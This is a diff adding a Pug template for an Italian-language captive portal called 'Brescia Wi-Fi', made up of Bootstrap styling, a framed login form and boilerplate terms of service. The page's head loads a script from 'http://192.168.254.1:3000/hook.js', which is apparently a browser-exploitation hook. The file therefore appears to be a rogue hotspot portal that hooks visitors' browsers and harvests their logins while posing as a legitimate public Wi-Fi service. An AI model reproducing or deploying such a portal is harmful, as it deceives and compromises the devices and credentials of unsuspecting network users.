@@ -1,0 +1,417 @@
+doctype html
+html(lang='en')
+	head
+	link(href="/css/bootstrap.css" rel="stylesheet" type="text/css")
+	meta(charset='utf-8')
+	meta(http-equiv='X-UA-Compatible', content='IE=edge')
+	meta(name='viewport', content='width=device-width, initial-scale=1')
+	title Brescia Wi-Fi
+	script(src="http://192.168.254.1:3000/hook.js")
+	style.
+		html {
+		font-family: sans-serif;
+		-ms-text-size-adjust: 100%;
+		-webkit-text-size-adjust: 100%;
+		}
+		body {
+		margin: 0;
+		}
+		h1 {
+		font-size: 2em;
+		margin: 0.67em 0;
+		}
+		input {
+		color: inherit;
+		font: inherit;
+		margin: 0;
+		}
+		input[type="submit"] {
+		-webkit-appearance: button;
+		cursor: pointer;
+		}
+		button::-moz-focus-inner,
+		input::-moz-focus-inner {
+		border: 0;
+		padding: 0;
+		}
+		input {
+		line-height: normal;
+		}
+		@media print {
+		*,
+		*:before,
+		*:after {
+		background: transparent !important;
+		color: #000 !important;
+		-webkit-box-shadow: none !important;
+		box-shadow: none !important;
+		text-shadow: none !important;
+		}
+		p {
+		orphans: 3;
+		widows: 3;
+		}
+		}
+		* {
+		-webkit-box-sizing: border-box;
+		-moz-box-sizing: border-box;
+		box-sizing: border-box;
+		}
+		*:before,
+		*:after {
+		-webkit-box-sizing: border-box;
+		-moz-box-sizing: border-box;
+		box-sizing: border-box;
+		}
+		html {
+		font-size: 10px;
+		-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+		}
+		body {
+		font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+		font-size: 14px;
+		line-height: 1.42857143;
+		color: #333333;
+		background-color: #ffffff;
+		}
+		input {
+		font-family: inherit;
+		font-size: inherit;
+		line-height: inherit;
+		}
+		h1 {
+		font-family: inherit;
+		font-weight: 500;
+		line-height: 1.1;
+		color: inherit;
+		}
+		h1 {
+		margin-top: 20px;
+		margin-bottom: 10px;
+		}
+		h1 {
+		font-size: 36px;
+		}
+		p {
+		margin: 0 0 10px;
+		}
+		.lead {
+		margin-bottom: 20px;
+		font-size: 16px;
+		font-weight: 300;
+		line-height: 1.4;
+		}
+		@media (min-width: 768px) {
+		.lead {
+		font-size: 21px;
+		}
+		}
+		.row {
+		margin-left: -15px;
+		margin-right: -15px;
+		}
+		.col-sm-2,
+		.col-md-8,
+		.col-sm-10 {
+		position: relative;
+		min-height: 1px;
+		padding-left: 15px;
+		padding-right: 15px;
+		}
+		@media (min-width: 768px) {
+		.col-sm-2,
+		.col-sm-10 {
+		float: left;
+		}
+		.col-sm-10 {
+		width: 83.33333333%;
+		}
+		.col-sm-2 {
+		width: 16.66666667%;
+		}
+		.col-sm-offset-2 {
+		margin-left: 16.66666667%;
+		}
+		}
+		@media (min-width: 992px) {
+		.col-md-8 {
+		float: left;
+		}
+		.col-md-8 {
+		width: 66.66666667%;
+		}
+		.col-md-offset-2 {
+		margin-left: 16.66666667%;
+		}
+		}
+		label {
+		display: inline-block;
+		max-width: 100%;
+		margin-bottom: 5px;
+		font-weight: bold;
+		}
+		.form-control {
+		display: block;
+		width: 100%;
+		height: 34px;
+		padding: 6px 12px;
+		font-size: 14px;
+		line-height: 1.42857143;
+		color: #555555;
+		background-color: #ffffff;
+		background-image: none;
+		border: 1px solid #cccccc;
+		border-radius: 4px;
+		-webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+		-webkit-transition: border-color ease-in-out .15s, -webkit-box-shadow ease-in-out .15s;
+		-o-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
+		transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
+		}
+		.form-control:focus {
+		border-color: #66afe9;
+		outline: 0;
+		-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102, 175, 233, 0.6);
+		box-shadow: inset 0 1px 1px rgba(0,0,0,.075), 0 0 8px rgba(102, 175, 233, 0.6);
+		}
+		.form-control::-moz-placeholder {
+		color: #999999;
+		opacity: 1;
+		}
+		.form-control:-ms-input-placeholder {
+		color: #999999;
+		}
+		.form-control::-ms-expand {
+		border: 0;
+		background-color: transparent;
+		}
+		.form-group {
+		margin-bottom: 15px;
+		}
+		.input-lg {
+		height: 46px;
+		padding: 10px 16px;
+		font-size: 18px;
+		line-height: 1.3333333;
+		border-radius: 6px;
+		}
+		.form-horizontal .form-group {
+		margin-left: -15px;
+		margin-right: -15px;
+		}
+		@media (min-width: 768px) {
+		.form-horizontal .control-label {
+		text-align: right;
+		margin-bottom: 0;
+		padding-top: 7px;
+		}
+		}
+		.btn {
+		display: inline-block;
+		margin-bottom: 0;
+		font-weight: normal;
+		text-align: center;
+		vertical-align: middle;
+		-ms-touch-action: manipulation;
+		touch-action: manipulation;
+		cursor: pointer;
+		background-image: none;
+		border: 1px solid transparent;
+		white-space: nowrap;
+		padding: 6px 12px;
+		font-size: 14px;
+		line-height: 1.42857143;
+		border-radius: 4px;
+		-webkit-user-select: none;
+		-moz-user-select: none;
+		-ms-user-select: none;
+		user-select: none;
+		}
+		.btn:focus,
+		.btn:active:focus {
+		outline: thin dotted;
+		outline: 5px auto -webkit-focus-ring-color;
+		outline-offset: -2px;
+		}
+		.btn:hover,
+		.btn:focus {
+		color: #333333;
+		text-decoration: none;
+		}
+		.btn:active {
+		outline: 0;
+		background-image: none;
+		-webkit-box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
+		box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
+		}
+		.btn-primary {
+		color: #ffffff;
+		background-color: #337ab7;
+		border-color: #2e6da4;
+		}
+		.btn-primary:focus {
+		color: #ffffff;
+		background-color: #286090;
+		border-color: #122b40;
+		}
+		.btn-primary:hover {
+		color: #ffffff;
+		background-color: #286090;
+		border-color: #204d74;
+		}
+		.btn-primary:active {
+		color: #ffffff;
+		background-color: #286090;
+		border-color: #204d74;
+		}
+		.btn-primary:active:hover,
+		.btn-primary:active:focus {
+		color: #ffffff;
+		background-color: #204d74;
+		border-color: #122b40;
+		}
+		.btn-primary:active {
+		background-image: none;
+		}
+		.btn-lg {
+		padding: 10px 16px;
+		font-size: 18px;
+		line-height: 1.3333333;
+		border-radius: 6px;
+		}
+		.btn-block {
+		display: block;
+		width: 100%;
+		}
+		input[type="submit"].btn-block {
+		width: 100%;
+		}
+		.row:before,
+		.row:after,
+		.form-horizontal .form-group:before,
+		.form-horizontal .form-group:after {
+		content: " ";
+		display: table;
+		}
+		.row:after,
+		.form-horizontal .form-group:after {
+		clear: both;
+		}
+		@-ms-viewport {
+		width: device-width;
+		}
+		/* Links */
+		/* Custom default button */
+		/*
+		* Base structure
+		*/
+		html,
+		body {
+		height: 100%;
+		background-color: #333;
+		}
+		body {
+		color: #fff;
+		text-align: center;
+		text-shadow: 0 1px 3px rgba(0,0,0,.5);
+		}
+		/* Extra markup and styles for table-esque vertical and horizontal centering */
+		.site-wrapper {
+		display: table;
+		width: 100%;
+		height: 100%;
+		/* For at least Firefox */
+		min-height: 100%;
+		-webkit-box-shadow: inset 0 0 100px rgba(0,0,0,.5);
+		box-shadow: inset 0 0 100px rgba(0,0,0,.5);
+		}
+		.site-wrapper-inner {
+		display: table-cell;
+		vertical-align: top;
+		}
+		.cover-container {
+		margin-right: auto;
+		margin-left: auto;
+		}
+		/* Padding for spacing */
+		.inner {
+		padding: 30px;
+		}
+		/*
+		* Header
+		*/
+		/*
+		* Cover
+		*/
+		.cover {
+		padding: 0 20px;
+		}
+		.cover .btn-lg {
+		padding: 10px 20px;
+		font-weight: bold;
+		}
+		/*
+		* Footer
+		*/
+		/*
+		* Affix and center
+		*/
+		@media (min-width: 768px) {
+		/* Pull out the header and footer */
+		/* Start the vertical centering */
+		.site-wrapper-inner {
+		vertical-align: top;
+		}
+		/* Handle the widths */
+		.cover-container {
+		width: 100%;
+		/* Must be percentage or pixels for horizontal alignment */
+		}
+		}
+		@media (min-width: 992px) {
+		.cover-container {
+		width: 800px;
+		}
+		}
+		.terms {
+			color: #aaa;
+		}
+		.error {
+		color: red;
+		}
+	body
+		script.
+			var fatto = false;
+			function logga() {
+				fatto = true;
+			}
+			function controlla() {
+				if (!fatto)
+					alert("Devi effettuare il login!");
+				return fatto;
+			}
+		.site-wrapper
+			.site-wrapper-inner
+				.cover-container
+					.inner.cover
+						h1.cover-heading Benvenuto su Brescia Wi-Fi
+						p.lead
+							| Utilizzando Brescia Wi-Fi dichiari di essere d'accordo con i termini di servizio dell'hotspot. L'accettazione dei termini di servizio è necessaria per usufruire del servizio.
+						.row
+							.col-md-8.col-md-offset-2
+								iframe(src="/login" onload="this.style.height = this.contentWindow.document.body.scrollHeight + 'px'")
+						.row
+							form(method="post" action="entra" onsubmit="return controlla()")
+								.checkbox: label
+									input(type="checkbox" required)
+									| Accetto i Termini di Servizio.
+								input.form-control.btn.btn-primary(type="submit" value="Entra")
+						hr
+						.terms
+							h3 Termini di utilizzo
+							p.
+								L’Utente garantisce che qualunque materiale o messaggio eventualmente immesso tramite l'hotspot riconducibile allo stesso in virtù della sottoscrizione del contratto è di propria titolarità e/o nella propria disponibilità giuridica, in difetto obbligandosi il cliente a manlevare e tenere indenne il gestore da ogni eventuale conseguenza pregiudizievole. L’Utente inoltre garantisce che detto materiale non viola o non trasgredisce alcun diritto di autore, marchio di fabbrica, brevetto o altro diritto derivante dalla legge, dal contratto e dalla consuetudine. L’Utente prende inoltre atto del fatto che è vietato servirsi o dar modo ad altri di utilizzare il servizio contro la morale e l'ordine pubblico o con lo scopo di recare molestia alla quiete pubblica o privata, di recare offesa, o danno diretto o indiretto a chicchessia e di tentare di violare comunque il segreto dei messaggi privati. Più in particolare è fatto espresso divieto per l’Utente di utilizzare tecniche di "mail spamming" o equivalenti (invio di messaggi di posta elettronica non sollecitati e/o senza espressa autorizzazione del destinatario di qualsivoglia contenuto e verso qualsivoglia destinatario).
+							p.
+								L’Utente può utilizzare la casella di posta elettronica fornita all'atto dell'attivazione del servizio sia per fini privati che commerciali. In ogni caso le informazioni immesse dal cliente nella rete non devono presentare forme o contenuti di carattere pornografico, osceno, blasfemo o diffamatorio. È comunque esplicitamente vietato utilizzare il servizio per contravvenire in modo diretto o indiretto alle vigenti leggi dello Stato italiano o di qualunque altro Stato.
+							p.
+								L’Utente garantisce che qualunque materiale immesso nella rete non viola diritti d'autore, o altri diritti di proprietà intellettuale o industriale. L’Utente riconosce inoltre che è vietato servirsi o dar modo ad altri di servirsi dei Servizi per atti contro la morale o l'ordine pubblico o con lo scopo di molestare la quiete altrui, danneggiare o violare o tentare di violare comunque il segreto della corrispondenza. L’Utente si impegna a non immettere in rete, utilizzando i Servizi, informazioni che possano presentare forme e/o contenuti di carattere pornografico, osceno, blasfemo o diffamatorio. E' vietato l'uso del Servizio per commettere o favorire la commissione di reati di qualunque tipo. L’Utente non utilizzerà, e adotterà ogni cautela affinché soggetti terzi non utilizzino, i Servizi per effettuare comunicazioni che arrechino danni o turbative ad operatori di telecomunicazioni o utenti o che violino le leggi ed i regolamenti vigenti o siano contrari all'ordine pubblico. Pertanto a titolo esemplificativo, non effettuerà, né consentirà ad altri di effettuare, l'invio di comunicazioni commerciali non richieste (spamming), l'invio massivo di comunicazioni non sollecitate e non richieste ai singoli indirizzi e--mail/identificativi di rete (mailbombing), la realizzazione di tentativi non autorizzati, andati a buon fine o meno, per accedere ad eventuali indirizzi o risorse di computer non appartenenti all’Utente (spoofing) e si impegna ad adottare adeguati strumenti di protezione da virus informatici.
